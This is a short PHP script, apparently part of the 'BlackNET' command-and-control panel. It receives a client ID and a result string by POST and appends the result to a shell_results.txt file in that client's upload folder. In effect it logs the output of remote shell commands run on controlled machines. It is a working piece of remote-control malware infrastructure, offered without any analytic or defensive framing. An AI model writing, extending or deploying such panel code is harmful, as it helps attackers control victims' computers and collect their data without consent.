<?php
require_once 'config/config.php';
require_once APP_PATH . 'classes/POST.php';
require_once APP_PATH . 'classes/Utils.php';

$post = new BlackNET\POST();

$utils = new BlackNET\Utils();

$client = $utils->sanitize($_POST['clientid']);

$result = $utils->sanitize($_POST['result']);

$post->prepare(realpath(APP_PATH . "upload/" . $client), "shell_results.txt", $result, "a+");

$post->write();
